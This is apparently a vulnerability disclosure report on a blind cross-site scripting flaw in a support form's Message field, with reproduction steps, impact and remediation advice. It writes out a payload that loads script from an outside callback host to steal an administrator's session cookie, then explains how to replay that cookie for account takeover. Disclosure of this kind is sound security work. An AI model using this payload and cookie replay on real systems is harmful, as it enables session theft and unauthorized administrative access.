## Title
Blind XSS - SupportHub

## Description
**Affected URL:** https://supporthub.pwnedbox.site/

**Affected Parameter / Field:** `Message` (Contact Support Form)  

**Vulnerability Type:** Blind Cross-Site Scripting (Blind XSS) -> Admin Account Takeover

A **Blind Cross-Site Scripting (XSS)** vulnerability exists in the **Message** field of the **Tell us what's going on** support form (`https://supporthub.pwnedbox.site`). User-supplied input submitted through the public request form is stored in the backend database and rendered unescaped inside the administrative ticket detail page (`/admin/view.php?id=<ID>`).

Because the `PHPSESSID` session cookie lacks the `HttpOnly` flag and the application fails to sanitize HTML tags or enforce a Content Security Policy, an unauthenticated attacker can inject an external script payload (`<sCRipT src=...>`) that executes automatically when a support agent or administrator views the request—exfiltrating the administrator's session cookie and enabling **full administrative account takeover**.

## Steps to Reproduce
1. Navigate to `https://supporthub.pwnedbox.site/submit.php`, fill in valid details for **Name**, **Email**, and **Subject**, enter `'"><sCRipT src=https://xss.report/c/{account_name}></sCRipT>` into the **Message** field, and click **Submit request**.
2. Log in to the admin panel and click **View** on the submitted request.
3. Observe on `xss.report` that the Blind XSS callback fires immediately, capturing the admin URL, screenshot, and non-`HttpOnly` `PHPSESSID` cookie (`00393020b22526e39995c8748c130155`).
4. In an unauthenticated browser session, replace the `PHPSESSID` cookie value via DevTools (`Application -> Cookies`) with the captured admin `PHPSESSID` and navigate to `https://supporthub[.]pwnedbox.site/admin/index.php` to confirm full administrative access.

## POC (Proof of Concept)
**1. Submit form with payload in message field**

<img width="1000" height="508" alt="image" src="https://github.com/user-attachments/assets/8379fd71-344b-41d9-a011-f72b3ac1b2ad" />

**2. Log in as admin and check the request**

<img width="1000" height="502" alt="image" src="https://github.com/user-attachments/assets/0606ce41-0d50-4c7f-bb5f-e2e9a281f9da" />

**3. See that admin's cookie has been captured via xss.report**

<img width="1000" height="510" alt="image" src="https://github.com/user-attachments/assets/25b7a556-bc9d-4e5d-8c02-72024b340d3f" />

**4. Use cookie of admin in normal user's browser session**

<img width="1000" height="443" alt="image" src="https://github.com/user-attachments/assets/92820312-4a01-4989-b3f6-94496a4f22c0" />

**5. Observe admin account takeover**

<img width="1000" height="413" alt="image" src="https://github.com/user-attachments/assets/23c8bf0a-3c3f-467c-9585-06b8835634d3" />

## Impact
An unauthenticated external attacker can achieve **full administrative account takeover** without needing prior credentials or user interaction beyond normal administrative workflow (viewing incoming support requests). Successful exploitation allows an attacker to:
* Steal active administrator session cookies (`PHPSESSID`) and hijack privileged admin sessions.
* View, modify, or delete all confidential customer support requests and sensitive user data.
* Deface the website or pivot to further server-side attacks from the authenticated admin panel.

## Remediation
* **Context-Aware Output Encoding:** Encode all user-supplied support request fields (including `Message`, `Name`, `Email`, and `Subject`) using HTML entity encoding (`<` to `&lt;`, `>` to `&gt;`, `"` to `&quot;`, `'` to `&#x27;`) before rendering them inside `/admin/view.php` and `/admin/index.php`.
* **Set `HttpOnly` and `Secure` Cookie Flags:** Configure the `PHPSESSID` session cookie with `HttpOnly`, `Secure`, and `SameSite=Strict` (or `Lax`) attributes so sensitive session tokens cannot be read via `document.cookie`.
* **Implement Content Security Policy (CSP):** Configure a strict `Content-Security-Policy` HTTP response header (e.g., `default-src 'self'; script-src 'self'`) to block unauthorized external script domains and inline JavaScript execution.
